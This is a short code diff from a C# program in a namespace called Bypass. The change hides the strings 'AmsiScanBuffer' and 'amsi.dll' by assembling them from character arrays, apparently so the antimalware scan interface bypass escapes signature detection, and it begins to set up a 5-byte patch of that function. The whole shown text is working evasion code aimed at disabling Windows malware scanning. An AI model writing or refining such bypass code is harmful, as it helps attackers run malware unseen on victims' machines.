@@ -21,8 +21,12 @@ namespace Bypass {
         static int Bypass()
         {
             char[] chars = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' };
-            String func = string.Join("", chars);
-            IntPtr Address = GetProcAddress(LoadLibrary("am" + "si.dll"), func);
+            String funcName = string.Join("", chars);
+            
+            char[] chars2 = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' };
+            String libName = string.Join("", chars2);
+            
+            IntPtr Address = GetProcAddress(LoadLibrary(libName), funcName);
 
             UIntPtr size = (UIntPtr)5;
             uint p = 0;
